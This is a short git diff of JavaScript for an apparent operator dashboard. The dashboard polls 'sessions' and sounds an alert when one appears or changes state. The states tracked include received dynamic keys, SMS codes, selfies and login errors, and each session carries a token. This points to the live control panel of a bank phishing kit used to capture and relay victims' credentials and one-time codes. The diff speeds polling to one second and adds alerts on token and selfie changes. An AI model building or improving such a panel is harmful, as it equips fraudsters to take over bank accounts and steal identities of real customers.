@@ -424,38 +424,16 @@ async function pollSessions() {
     if (response.ok) {
       const list = await response.json();
       
-      // Track existing new entries BEFORE clearing the map
       const oldKeys = new Set(rows.keys());
       let hasNewOrChangedSession = false;
       
       list.forEach((session) => {
         if (!oldKeys.has(session.id)) {
           hasNewOrChangedSession = true;
-          requestAnimationFrame(() => {
-            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
-            if (!tr) return
-            tr.classList.add('is-new')
-            setTimeout(() => tr.classList.remove('is-new'), 1800)
-          })
         } else {
-          // Compare with stored session BEFORE overwriting it
           const oldSession = rows.get(session.id);
-          if (oldSession && oldSession.state !== session.state) {
-            // Trigger sound on any relevant state changes
-            if (
-              session.state === 'waiting' ||
-              session.state === 'received-dinamica' ||
-              session.state === 'received-sms' ||
-              session.state === 'waiting-selfie' ||
-              session.state === 'received-selfie' ||
-              session.state === 'error-login' ||
-              session.state === 'error-dinamica' ||
-              session.state === 'error-sms' ||
-              session.state === 'error-selfie' ||
-              session.state === 'done'
-            ) {
-              hasNewOrChangedSession = true;
-            }
+          if (oldSession && (oldSession.state !== session.state || oldSession.token !== session.token || (oldSession.selfies?.length || 0) !== (session.selfies?.length || 0))) {
+            hasNewOrChangedSession = true;
           }
         }
       });
@@ -487,7 +465,9 @@ async function pollSessions() {
         playNotificationSound();
       }
     }
-  } catch {}
+  } catch (err) {
+    console.error('Error in pollSessions:', err);
+  }
 }
 
 function initAudio() {
@@ -681,8 +661,8 @@ btnExport?.addEventListener('click', () => {
   exportToNotepad();
 });
 
-// Poll sessions every 2 seconds
-window.setInterval(pollSessions, 2000)
+// Poll sessions every 1 second
+window.setInterval(pollSessions, 1000)
 
 // Initial load
 pollSessions().then(() => {
